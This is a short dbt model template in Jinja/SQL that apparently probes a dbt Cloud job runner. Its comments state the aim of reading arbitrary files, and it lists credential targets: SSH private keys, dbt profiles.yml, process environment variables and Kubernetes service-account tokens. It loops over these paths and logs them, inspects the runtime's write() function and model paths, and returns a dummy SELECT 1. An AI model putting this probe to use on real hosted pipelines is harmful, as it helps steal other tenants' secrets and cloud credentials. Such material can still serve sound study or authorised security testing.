{# Try reading arbitrary files via load_agate_table #}
{%- set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') -%}

{# load_agate_table needs (model, path) - check if model is needed #}
{%- set files_to_try = [
  '/etc/hostname',
  '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
  '/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa',
  '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
  '/proc/self/environ',
  '/proc/1/cmdline',
  '/var/run/secrets/kubernetes.io/serviceaccount/token',
  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
  '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
] -%}

{%- for filepath in files_to_try -%}
  {%- set result = '' -%}
  {%- set error_msg = '' -%}
  
  {# Try 1: load_agate_table with just path #}
  {%- if load_agate_table is defined -%}
    {{ log("TRYING_FILE=" ~ filepath, info=True) }}
  {%- endif -%}
{%- endfor -%}

{# Try read via the write() function - check if it has a read mode #}
{%- if write is defined -%}
  {{ log("WRITE_TYPE=" ~ (write | string)[:200], info=True) }}
{%- endif -%}

{# Try the source_node/ref approach to read files #}
{%- if model is defined -%}
  {{ log("MODEL_PATH=" ~ model.get('original_file_path','?'), info=True) }}
  {{ log("MODEL_ROOT=" ~ model.get('root_path','?'), info=True) }}
{%- endif -%}

SELECT 1 as id
